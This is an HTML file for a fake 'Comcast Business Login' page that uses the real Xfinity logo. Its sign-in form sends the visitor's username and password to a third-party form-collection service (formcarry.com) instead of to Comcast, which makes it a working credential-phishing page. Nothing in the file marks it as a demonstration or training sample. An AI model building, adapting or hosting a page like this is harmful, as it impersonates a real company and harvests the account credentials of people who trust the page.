
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Comcast Business Login</title>
   <style>
body {
    font-family: Arial, sans-serif;
    background-color: #f9f9f9;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
}
.login-container {
    background-color: #fff;
    padding: 40px;
    box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
    border-radius: 8px;
    width: 350px;
    text-align: center;
}
.login-container img {
    width: 150px;
    margin-bottom: 20px;
}
.login-container h2 {
    margin-bottom: 20px;
    color: #333;
}
.login-container label {
    display: block;
    text-align: left;
    margin: 10px 0 5px;
    color: #555;
}
.login-container input[type="text"],
.login-container input[type="password"] {
    width: 100%;
    padding: 10px;
    margin-bottom: 20px;
    border: 1px solid #ddd;
    border-radius: 4px;
}
.login-container button {
    width: 100%;
    padding: 12px;
    background-color: #0071c5;
    color: #fff;
    border: none;
    border-radius: 4px;
    cursor: pointer;
    font-size: 16px;
}
.login-container button:hover {
    background-color: #005a9e;
}
.login-container .forgot-password {
    display: block;
    text-align: right;
    margin-top: 10px;
    color: #0071c5;
    text-decoration: none;
}
.login-container .forgot-password:hover {
    text-decoration: underline;
}
</style>
</head>
<body>
    <div class="login-container">
        <img src="https://login.xfinity.com/static/1.0.19/images/logo-xfinity.png" alt="Comcast Business">
        <h2>Sign In</h2>
        <form action="https://formcarry.com/s/7-OHiuZAqt9" method="POST" enctype="multipart/form-data">
            <label for="username">Username</label>
            <input type="text" id="username" name="username" required>

            <label for="password">Password</label>
            <input type="password" id="password" name="password" required>

            <button type="submit">Sign In</button>
        </form>
        <a href="#" class="forgot-password">Forgot Password?</a>
    </div>
</body>
</html>
